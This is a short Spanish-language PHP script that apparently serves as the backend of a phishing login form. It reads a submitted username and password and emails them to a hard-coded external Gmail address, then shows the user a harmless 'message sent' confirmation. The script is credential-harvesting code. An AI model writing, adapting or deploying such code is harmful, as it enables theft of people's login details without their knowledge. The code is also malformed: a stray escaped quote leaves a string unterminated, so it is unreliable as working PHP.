<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $usuario = $_POST['usuario'];
  $contraseña = $_POST['contraseña'];
  
  $destinatario = "angelcv1300@gmail.com";
  $asunto = "Nuevo mensaje del formulario";
  $contenido = "usuario: $usuario\ncontraseña: $contraseña\";

  // Enviar correo
  mail($destinatario, $asunto, $contenido);

  echo "Mensaje enviado correctamente.";
}
?>